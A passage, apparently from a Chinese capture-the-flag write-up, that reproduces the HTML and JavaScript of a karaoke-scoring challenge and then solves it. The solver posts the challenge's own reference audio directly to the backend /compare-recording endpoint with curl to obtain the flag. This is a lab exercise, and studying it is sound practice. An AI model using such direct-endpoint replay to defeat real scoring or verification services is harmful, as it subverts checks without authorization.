            background-color: #e74c3c;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: #c0392b;
        }
        .button:disabled {
            background-color: #95a5a6;
            cursor: not-allowed;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 4px;
            text-align: center;
        }
        .result-low {
            background-color: #d6eaf8;
            color: #2980b9;
        }
        .result-medium {
            background-color: #fdebd0;
            color: #e67e22;
        }
        .result-high {
            background-color: #d5f5e3;
            color: #27ae60;
        }
        .result-perfect {
            background-color: #ebdef0;
            color: #8e44ad;
        }
        .audio-container {
            margin: 20px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .audio-container h3 {
            margin-bottom: 10px;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.7);
        }
        .modal-content {
            position: relative;
            background-color: #fefefe;
            margin: 15% auto;
            padding: 30px;
            border-radius: 8px;
            width: 70%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            animation: modalopen 0.4s;
        }
        @keyframes modalopen {
            from {opacity: 0; transform: translateY(-30px);}
            to {opacity: 1; transform: translateY(0);}
        }
        .close-button {
            position: absolute;
            top: 10px;
            right: 15px;
            color: #aaa;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close-button:hover {
            color: #333;
        }
        .flag {
            margin: 30px 0;
            padding: 15px;
            font-size: 20px;
            font-weight: bold;
            color: #e74c3c;
            background-color: #f9ebea;
            border: 2px dashed #e74c3c;
            border-radius: 5px;
        }
        .timer {
            font-size: 24px;
            font-weight: bold;
            margin: 10px 0;
            color: #e74c3c;
        }
        .visualizer {
            width: 100%;
            height: 60px;
            margin: 20px 0;
            background-color: #f5f5f5;
            border-radius: 4px;
        }
        .similarity-meter {
            width: 100%;
            height: 20px;
            background-color: #ecf0f1;
            border-radius: 10px;
            margin: 15px 0;
            overflow: hidden;
        }
        .similarity-value {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #3498db, #2ecc71, #f1c40f, #e74c3c);
            border-radius: 10px;
            transition: width 0.5s ease-in-out;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #e74c3c;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .cooldown {
            font-size: 18px;
            margin-top: 10px;
            color: #e74c3c;
            font-weight: bold;
        }
        .warning {
            background-color: #fadbd8;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            color: #c0392b;
        }
        /* 添加退出确认对话框样式 */
        .exit-confirm-modal {
            display: none;
            position: fixed;
            z-index: 2;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.7);
        }
        
        .exit-confirm-content {
            position: relative;
            background-color: #fff2cc;
            margin: 15% auto;
            padding: 30px;
            border-radius: 8px;
            width: 70%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            animation: modalopen 0.4s;
            border-left: 5px solid #e74c3c;
        }
        
        .exit-confirm-title {
            color: #e74c3c;
            font-size: 20px;
            margin-bottom: 15px;
        }
        
        .exit-confirm-buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
        }
        
        .exit-confirm-buttons button {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        
        .exit-confirm-stay {
            background-color: #3498db;
            color: white;
        }
        
        .exit-confirm-leave {
            background-color: #e74c3c;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>KTV 录音评分系统</h1>
            <p>大家都会逆战吧, have a try </p>
        </div>
        
        <div class="audio-container">
            <h3>逆战&张杰:</h3>
            <audio id="originalAudio" controls>
                <source id="originalAudioSource" src="/original.wav" type="audio/wav">
                您的浏览器不支持音频播放
            </audio>
        </div>
        
        <div id="warningMessage" class="warning" style="display:none;"></div>
        
        <div class="controls">
            <div id="timer" class="timer">00:00</div>
            <canvas id="visualizer" class="visualizer"></canvas>
            
            <div class="similarity-meter">
                <div id="similarityValue" class="similarity-value"></div>
            </div>
            
            <button id="recordButton" class="button">开始录音</button>
            <div id="cooldownTimer" class="cooldown" style="display:none;"></div>
            <div id="loader" class="loader"></div>
        </div>
        
        <div id="result" class="result" style="display:none;"></div>
        
        <!-- 录音预览 -->
        <div class="audio-container" id="recordingContainer" style="display:none;">
            <h3>你的录音:</h3>
            <audio id="recordedAudio" controls></audio>
        </div>
    </div>
    
    <!-- FLAG弹窗 -->
    <div id="flagModal" class="modal">
        <div class="modal-content">
            <span class="close-button" onclick="closeModal()">&times;</span>
            <h2>恭喜你！歌神级别！</h2>
            <p>你的演唱简直完美，获得了最高评价！</p>
            <div class="flag" id="flagContent"></div>
            <button class="button" onclick="closeModal()">谢谢</button>
        </div>
    </div>

    <div id="exitConfirmModal" class="exit-confirm-modal">
        <div class="exit-confirm-content">
            <div class="exit-confirm-title">⚠️ 警告</div>
            <p>若您退出当下页面，所有录制的录音都会被删除！</p>
            <div class="exit-confirm-buttons">
                <button id="stayButton" class="exit-confirm-stay">留在页面</button>
                <button id="leaveButton" class="exit-confirm-leave">确认退出</button>
            </div>
        </div>
    </div>

    <script>
        let audioContext;
        let analyser;
        let microphone;
        let mediaRecorder;
        let audioChunks = [];
        let isRecording = false;
        let startTime;
        let timerInterval;
        let visualizerContext;
        
        // 时间
        let lastRequestTime = 0;
        const MIN_REQUEST_INTERVAL = 10000; // 10秒，与服务器端保持一致
        let cooldownInterval = null;

        // DOM元素
        const recordButton = document.getElementById('recordButton');
        const timer = document.getElementById('timer');
        const visualizer = document.getElementById('visualizer');
        const recordingContainer = document.getElementById('recordingContainer');
        const recordedAudio = document.getElementById('recordedAudio');
        const result = document.getElementById('result');
        const loader = document.getElementById('loader');
        const similarityValue = document.getElementById('similarityValue');
        const flagModal = document.getElementById('flagModal');
        const flagContent = document.getElementById('flagContent');
        const cooldownTimer = document.getElementById('cooldownTimer');
        const warningMessage = document.getElementById('warningMessage');
        const originalAudio = document.getElementById('originalAudio');
        const originalAudioSource = document.getElementById('originalAudioSource');
        
        originalAudio.addEventListener('error', function(e) {
            console.error('音频加载失败:', e);
            warningMessage.textContent = '原始音频加载失败，请刷新页面重试';
            warningMessage.style.display = 'block';
            
            fetch('/get-original-audio')
                .then(response => response.json())
                .then(data => {
                    if (data && data.url) {
                        console.log('从API获取音频URL:', data.url);
                        originalAudioSource.src = data.url + '?t=' + new Date().getTime(); // 添加时间戳防止缓存
                        originalAudio.load(); 
                    }
                })
                .catch(err => {
                    console.error('获取音频URL失败:', err);
                });
        });
        
        // 添加退出确认对话框元素
        const exitConfirmModal = document.getElementById('exitConfirmModal');
        const stayButton = document.getElementById('stayButton');
        const leaveButton = document.getElementById('leaveButton');
        

        let currentRecordingFilename = null;
        visualizerContext = visualizer.getContext('2d');
        visualizer.width = visualizer.offsetWidth;
        visualizer.height = visualizer.offsetHeight;
        
        recordButton.addEventListener('click', () => {
            if (!isRecording) {
                if (!canMakeRequest()) {
                    showCooldownMessage();
                    return;
                }
                
                // 如果有上一段录音，先清理
                if (currentRecordingFilename) {
                    cleanRecording(currentRecordingFilename);
                    currentRecordingFilename = null;
                }
                
                startRecording();
            } else {
                stopRecording();
            }
        });
        
        // 检查是否可以发送请求
        function canMakeRequest() {
            const now = Date.now();
            return now - lastRequestTime >= MIN_REQUEST_INTERVAL;
        }
        
        // 限时，避免过度请求
        function showCooldownMessage() {
            const now = Date.now();
            const remainingTime = Math.ceil((MIN_REQUEST_INTERVAL - (now - lastRequestTime)) / 1000);
            
            cooldownTimer.textContent = `请等待 ${remainingTime} 秒后再试`;
            cooldownTimer.style.display = 'block';
            
            if (cooldownInterval) {
                clearInterval(cooldownInterval);
            }
            
            cooldownInterval = setInterval(() => {
                const currentTime = Date.now();
                const remaining = Math.ceil((MIN_REQUEST_INTERVAL - (currentTime - lastRequestTime)) / 1000);
                
                if (remaining <= 0) {
                    clearInterval(cooldownInterval);
                    cooldownTimer.style.display = 'none';
                    cooldownTimer.textContent = '';
                } else {
                    cooldownTimer.textContent = `请等待 ${remaining} 秒后再试`;
                }
            }, 1000);
        }
        
        function updateTimer() {
            const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
            const minutes = Math.floor(elapsedTime / 60).toString().padStart(2, '0');
            const seconds = (elapsedTime % 60).toString().padStart(2, '0');
            timer.textContent = `${minutes}:${seconds}`;
        }
        
        // 可视化音频输入
        function visualize() {
            if (!audioContext || audioContext.state === 'closed') return;
            
            const bufferLength = analyser.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);
            
            const draw = () => {
                if (!isRecording) return;
                
                requestAnimationFrame(draw);
                analyser.getByteFrequencyData(dataArray);
                
                visualizerContext.clearRect(0, 0, visualizer.width, visualizer.height);
                
                const barWidth = (visualizer.width / bufferLength) * 2.5;
                let x = 0;
                
                for (let i = 0; i < bufferLength; i++) {
                    const barHeight = (dataArray[i] / 255) * visualizer.height;
                    
                    // 使用彩色渐变效果
                    const hue = i / bufferLength * 360;
                    visualizerContext.fillStyle = `hsl(${hue}, 100%, 50%)`;
                    visualizerContext.fillRect(x, visualizer.height - barHeight, barWidth, barHeight);
                    x += barWidth + 1;
                }
            };
            
            draw();
        }
        
        async function startRecording() {
            try {
                result.style.display = 'none';
                recordingContainer.style.display = 'none';
                warningMessage.style.display = 'none';
                
                try {
                    const prepareResponse = await fetch('/prepare-recording');
                    
                    if (!prepareResponse.ok) {
                        console.warn('预清理请求失败，继续录音:', prepareResponse.statusText);
                    } else {
                        // 检查内容类型
                        const contentType = prepareResponse.headers.get('content-type');
                        if (contentType && contentType.includes('application/json')) {
                            const data = await prepareResponse.json();
                            console.log('预清理结果:', data.message);
                        } else {
                            console.warn('预清理响应不是JSON格式，继续录音');
                        }
                    }
                } catch (cleanError) {
                    console.warn('预清理出错，继续录音:', cleanError);
                }
                
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('您的浏览器不支持录音功能。请使用Chrome, Firefox或Edge的最新版本。');
                }
                
                try {
                    // 获取录音权限
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    
                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    analyser = audioContext.createAnalyser();
                    microphone = audioContext.createMediaStreamSource(stream);
                    microphone.connect(analyser);
                    
                    analyser.fftSize = 256;
                    const bufferLength = analyser.frequencyBinCount;
                    const dataArray = new Uint8Array(bufferLength);
                    
                    if (typeof MediaRecorder === 'undefined') {
                        throw new Error('您的浏览器不支持MediaRecorder API。请使用Chrome, Firefox或Edge的最新版本。');
                    }
                    
                    // 创建媒体记录器
                    let mimeType = 'audio/wav';
                    
                    // 检查浏览器是否支持指定的MIME类型
                    if (!MediaRecorder.isTypeSupported(mimeType)) {
                        console.warn('浏览器不支持audio/wav格式，使用默认格式');
                        mimeType = '';
                    }
                    
                    const mediaRecorderOptions = mimeType ? 
                        { mimeType: mimeType, audioBitsPerSecond: 16000 } : 
                        { audioBitsPerSecond: 16000 };
                    
                    mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
                    audioChunks = [];
                    
                    // 收集录音数据
                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };
                    
                    // 录音停止后的处理
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        const audioUrl = URL.createObjectURL(audioBlob);
                        recordedAudio.src = audioUrl;
                        recordingContainer.style.display = 'block';
                        
                        uploadRecording(audioBlob);
                    };
                    
                    mediaRecorder.start();
                    isRecording = true;
                    recordButton.textContent = '停止录音';
                    recordButton.style.backgroundColor = '#c0392b';
                    
                    startTime = Date.now();
                    updateTimer();
                    timerInterval = setInterval(updateTimer, 1000);
                    
                    visualize();
                    
                } catch (mediaError) {
                    handleMediaError(mediaError);
                }
                
            } catch (error) {
                console.error('录音功能错误:', error);
                showErrorMessage(error.message || '无法访问麦克风，请确保您已授予录音权限。');
            }
        }
        
        // 停止录音
        function stopRecording() {
            console.log('停止录音函数被调用，当前状态:', {
                isRecording: isRecording,
                mediaRecorderExists: !!mediaRecorder,
                mediaRecorderState: mediaRecorder ? mediaRecorder.state : 'undefined'
            });
            
            try {
                if (!mediaRecorder) {
                    console.error('MediaRecorder对象不存在，无法停止录音');
                    showErrorMessage('录音设备异常，请刷新页面重试');
                    isRecording = false;
                    recordButton.textContent = '开始录音';
                    recordButton.style.backgroundColor = '#e74c3c';
                    return;
                }
                
                if (!isRecording) {
                    console.warn('状态显示未在录音中，但停止录音按钮被点击');
                    return;
                }
                
                // 确保MediaRecorder处于录音状态才能停止
                if (mediaRecorder.state === 'recording' || mediaRecorder.state === 'paused') {
                    // 请求数据
                    mediaRecorder.requestData();
                    
                    // 停止录音
                    mediaRecorder.stop();
                    console.log('MediaRecorder已停止');
                } else {
                    console.warn(`MediaRecorder状态异常: ${mediaRecorder.state}`);
                }
                //UI更新
                isRecording = false;
                recordButton.textContent = '开始录音';
                recordButton.style.backgroundColor = '#e74c3c';
                
                // 停止计时器
                if (timerInterval) {
                    clearInterval(timerInterval);
                    console.log('计时器已停止');
                }
                
                // 关闭音频流
                if (audioContext && audioContext.state !== 'closed') {
                    if (microphone) {
                        microphone.disconnect();
                        console.log('麦克风已断开连接');
                    }
                }
                
                if (audioChunks.length > 0 && mediaRecorder.state !== 'recording') {
                    console.log('手动处理录音数据');
                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                    const audioUrl = URL.createObjectURL(audioBlob);
                    recordedAudio.src = audioUrl;
                    recordingContainer.style.display = 'block';
                    
                    // 上传录音
                    uploadRecording(audioBlob);
                }
            } catch (error) {
                console.error('停止录音时出错:', error);
                showErrorMessage('停止录音时出错，请刷新页面重试');
                
                isRecording = false;
                recordButton.textContent = '开始录音';
                recordButton.style.backgroundColor = '#e74c3c';
            }
        }
        
        // 处理媒体访问错误
        function handleMediaError(error) {
            console.error('麦克风访问错误:', error);
            
            let errorMessage = '无法访问麦克风，请确保您已授予录音权限。';
            
            // 根据错误类型提供具体的错误信息
            if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                errorMessage = '您已拒绝麦克风访问权限。请点击浏览器地址栏的锁图标，更改麦克风权限设置，然后刷新页面。';
            } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
                errorMessage = '未检测到麦克风设备。请确认您的麦克风已正确连接，并且没有被系统禁用。';
            } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
                errorMessage = '麦克风正在被其他应用程序使用。请关闭可能正在使用麦克风的其他应用，然后刷新页面重试。';
            } else if (error.name === 'OverconstrainedError') {
                errorMessage = '麦克风设置约束条件无法满足。请使用其他麦克风设备重试。';
            } else if (error.name === 'TypeError') {
                errorMessage = '录音参数错误。请刷新页面重试。';
            } else if (error.name === 'AbortError') {
                errorMessage = '麦克风访问请求被中断。请刷新页面重试。';
            } else if (error.name === 'SecurityError') {
                errorMessage = '浏览器安全设置阻止了麦克风访问。请使用HTTPS连接或localhost访问本站点。';
            }
            
            showErrorMessage(errorMessage);
        }
        
        // 清理录音
        function cleanRecording(filename) {
            if (!filename) return;
            
            fetch(`/clean-recording/${filename}`, {
                method: 'DELETE'
            })
            .then(response => response.json())
            .then(data => {
                console.log('清理录音结果:', data.message);
            })
            .catch(error => {
                console.error('清理录音出错:', error);
            });
        }
        
        function cleanAllRecordings() {
            fetch('/clean-all-recordings', {
                method: 'DELETE'
            })
            .then(response => response.json())
            .then(data => {
                console.log('清理所有录音结果:', data.message);
            })
            .catch(error => {
                console.error('清理所有录音出错:', error);
            });
        }
        
        function uploadRecording(audioBlob) {
            loader.style.display = 'block';
            result.style.display = 'none';
            similarityValue.style.width = '0%';
            
            lastRequestTime = Date.now();
            
            
            const formData = new FormData();
            formData.append('audio', audioBlob, 'recording.wav');
            
            fetch('/compare-recording', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // 检查响应状态
                if (!response.ok) {
                    throw new Error(`服务器响应错误: ${response.status} ${response.statusText}`);
                }
                return response.json();
            })
            .then(data => {
                // 隐藏加载状态
                loader.style.display = 'none';
                
                // 如果成功获取到录音文件名，保存它
                if (data.filename) {
                    currentRecordingFilename = data.filename;
                }
                
                // 显示匹配度
                const similarity = parseFloat(data.similarity);
                similarityValue.style.width = `${similarity}%`;
                
                // 显示结果
                result.textContent = `匹配度: ${similarity.toFixed(2)}% - ${data.message}`;
                result.style.display = 'block';
                
                // 根据匹配度设置不同的样式
                result.className = 'result';
                if (similarity >= 98) {
                    result.classList.add('result-perfect');
                } else if (similarity >= 85) {
                    result.classList.add('result-high');
                } else if (similarity >= 70) {
                    result.classList.add('result-medium');
                } else {
                    result.classList.add('result-low');
                }
                
                // 如果有FLAG，显示FLAG弹窗
                if (data.flag) {
                    showFlagModal(data.flag);
                }
            })
            .catch(error => {
                console.error('上传录音出错:', error);
                loader.style.display = 'none';
                result.textContent = '评分失败，请稍后重试: ' + error.message;
                result.className = 'result result-low';
                result.style.display = 'block';
            });
        }
        
        function showErrorMessage(message) {
            warningMessage.textContent = message;
            warningMessage.style.display = 'block';
            
            isRecording = false;
            recordButton.textContent = '开始录音';
            recordButton.style.backgroundColor = '#e74c3c';
            
            if (timerInterval) {
                clearInterval(timerInterval);
            }
        }
        
        // 显示FLAG弹窗
        function showFlagModal(flag) {
            flagContent.textContent = flag;
            flagModal.style.display = 'block';
        }
        
        function closeModal() {
            flagModal.style.display = 'none';
        }
        
        window.onclick = function(event) {
            if (event.target === flagModal) {
                flagModal.style.display = 'none';
            }
        }
        
        // 页面卸载前处理
        window.addEventListener('beforeunload', function(event) {
            // 显示确认对话框
            exitConfirmModal.style.display = 'block';
            
            // 阻止页面立即卸载，显示确认对话框
            event.preventDefault();
            event.returnValue = '';
            
            // 注意：现代浏览器出于安全考虑可能会忽略自定义消息
            return '若您退出当下页面，所有录制的录音都会被删除！';
        });
        
        // 用户选择页面
        stayButton.addEventListener('click', function() {
            exitConfirmModal.style.display = 'none';
        });
        
        leaveButton.addEventListener('click', function() {
            cleanAllRecordings();
            
            exitConfirmModal.style.display = 'none';
            
            setTimeout(() => {
                window.location.href = 'about:blank';
            }, 500);
        });
    </script>
</body>
</html>
```

发现flag获取条件如下：

```
if (similarity >= 98) {
    result.classList.add('result-perfect');
}
```

但是紧接着又发现：

```
if (data.flag) {
    showFlagModal(data.flag);
}
```

说明flag是从后端传来，改动前端similarity值不能得到flag

唱歌肯定不行，那么既然网站提供了原音频下载，就可以直接提交原音频

但网页没有提供提交入口，而代码中是前端将录音文件上传到/compare-recording，那就可以直接与后端建立联系

使用curl：

```
curl -X POST http://127.0.0.1:xxxx/compare-recording -F "audio=@original.wav" 
```

直接得到返回的flag

